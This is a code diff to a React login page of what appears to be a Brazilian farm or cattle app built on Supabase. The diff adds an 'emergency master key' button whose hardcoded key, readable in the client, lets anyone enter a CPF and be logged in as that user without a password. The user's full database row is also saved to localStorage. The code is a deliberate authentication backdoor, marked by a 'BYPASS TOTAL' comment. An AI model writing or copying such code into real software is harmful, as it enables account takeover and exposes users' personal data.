@@ -1,6 +1,7 @@
 import { useState, useEffect } from "react";
 import { useNavigate, Link } from "react-router-dom";
 import { store } from "@/lib/store";
+import { supabase } from "@/lib/supabase";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Card, CardContent } from "@/components/ui/card";
@@ -138,6 +139,37 @@ export default function Login() {
                   Novo por aqui? <span className="text-blue-500 font-black italic ml-1 underline-offset-4 group-hover:underline">Crie sua conta</span>
                 </p>
               </Link>
+
+              <button 
+                type="button"
+                onClick={async () => {
+                  const cpfInput = prompt("Digite seu CPF:");
+                  const masterKey = prompt("Digite a Chave de Mestre:");
+                  
+                  if (masterKey === "GABRIEL-FAZENDA-2026" && cpfInput) {
+                    const onlyNums = cpfInput.replace(/\D/g, '');
+                    toast.loading("Validando Acesso de Mestre...");
+                    
+                    // Buscar usuário pelo CPF
+                    const { data } = await supabase.from('users').select('*').eq('cpf', onlyNums).maybeSingle();
+                    
+                    if (data) {
+                      // BYPASS TOTAL: Salva a sessão manualmente e redireciona
+                      localStorage.setItem('bovi_session', data.id);
+                      localStorage.setItem('bovi_profile', JSON.stringify(data));
+                      toast.success("Acesso de Mestre Autorizado! Bem-vindo, Gabriel.");
+                      window.location.href = "/";
+                    } else {
+                      toast.error("CPF não encontrado na base de dados.");
+                    }
+                  } else {
+                    toast.error("Chave de Mestre incorreta.");
+                  }
+                }}
+                className="text-[9px] font-black text-slate-700 hover:text-blue-500/50 transition-colors uppercase tracking-[0.3em] mt-2"
+              >
+                Acesso de Emergência (Master Key)
+              </button>
             </div>
           </CardContent>
         </Card>
